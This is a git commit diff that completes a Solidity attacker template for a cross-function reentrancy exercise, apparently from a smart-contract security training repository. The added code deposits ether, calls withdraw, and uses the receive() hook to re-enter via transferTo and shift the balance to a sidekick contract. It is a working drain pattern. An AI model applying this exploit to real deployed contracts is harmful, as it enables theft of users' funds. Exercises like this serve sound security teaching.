37beac503535bf36df8a27372f108434039ed699
ikcoin <ikcoin.kb@protonmail.com>
2023-05-15 22:32:43 +0200

    02 Cross function reentrancy

--- src/02-template_attacker.sol
+++ src/02-template_attacker.sol
@@ -1,42 +1,41 @@
 // SPDX-License-Identifier: GPL-3.0
 pragma solidity ^0.8.13;
 
-
 interface IVulnerable {
     function withdraw() external;
+
     function deposit() external payable;
-	function transferTo(address _recipient, uint _amount) external;
+
+    function transferTo(address _recipient, uint _amount) external;
 }
 
 interface ISidekick {
-	function exploit() external payable;
+    function exploit() external payable;
 }
 
-
 contract Attacker {
+    IVulnerable public target;
+    ISidekick public sidekick;
 
-	IVulnerable public target;
-	ISidekick public sidekick;
-	
-	constructor(address _target) {
-		target = IVulnerable(_target);
-	}
+    constructor(address _target) {
+        target = IVulnerable(_target);
+    }
 
-	function setSidekick(address _sidekick) public {
-		sidekick = ISidekick(_sidekick);
-	}
+    function setSidekick(address _sidekick) public {
+        sidekick = ISidekick(_sidekick);
+    }
 
     receive() external payable {
-        /*
-            Your code goes here!
-        */
+        target.transferTo(address(sidekick), 1 ether);
     }
 
     function exploit() public payable {
-        
-        /*
-            Your code goes here!
-        */
+        target.deposit{value: 1 ether}();
+
+        target.withdraw();
+
+        if (address(target).balance >= 1 ether) {
+            sidekick.exploit();
+        }
     }
-    
 }
